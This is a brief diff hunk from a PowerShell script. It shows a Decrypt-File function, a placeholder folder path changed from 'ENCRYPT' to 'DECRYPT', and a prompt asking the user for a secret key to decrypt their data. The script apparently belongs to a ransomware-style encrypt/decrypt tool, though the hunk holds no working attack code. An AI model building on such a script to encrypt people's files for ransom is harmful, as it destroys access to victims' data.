@@ -41,7 +41,7 @@ function Decrypt-File($bytes, $key) {
 
 
 
-$files = Get-ChildItem -Path "PATH/TO/FOLDER/TO/ENCRYPT/DATA" #exclude system files!!!
+$files = Get-ChildItem -Path "PATH/TO/FOLDER/TO/DECRYPT/DATA" #exclude system files!!!
 
 
 Write-Host "To decrypt your data insert the secret key:"
